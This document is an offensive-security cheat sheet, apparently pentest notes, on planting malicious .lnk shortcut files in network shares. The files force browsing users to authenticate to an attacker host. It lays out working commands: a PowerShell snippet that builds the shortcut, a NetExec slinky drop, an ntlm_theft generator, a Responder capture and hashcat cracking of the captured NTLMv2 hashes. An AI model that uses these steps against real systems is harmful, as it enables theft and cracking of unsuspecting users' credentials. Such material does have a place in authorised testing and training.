# LNK File Attack (Waterhole)

## What Is It?

Drop a malicious `.lnk` (shortcut) file in a network share. When anyone browses the share, their machine automatically tries to load the icon from your attacker machine -> sends NTLMv2 hash to Responder.

---

## Manual (PowerShell)

```powershell
$objShell = New-Object -ComObject WScript.Shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\<KALI-IP>\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```

Copy `test.lnk` to a target file share. Run Responder and wait.

---

## Automated (NetExec Slinky Module)

```sh
# Auto-drops LNK file and captures hashes (only works on exposed shares)
netexec smb <ip> -d domain.local -u user -p Password -M slinky -o NAME=test SERVER=<KALI-IP>
```

---

## Alternative (ntlm_theft)

```sh
# Generate multiple file types that trigger auth
python3 ntlm_theft.py -g modern -s <KALI-IP> -f filename
```

---

## Capture Hashes with Responder

```sh
sudo responder -I eth0 -dPv
```

Watch for NTLMv2 hashes as users browse the share.

Crack with:
```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Additional Forced Auth Methods

- RTF files with embedded UNC paths
- Office documents with external template refs
- See: https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
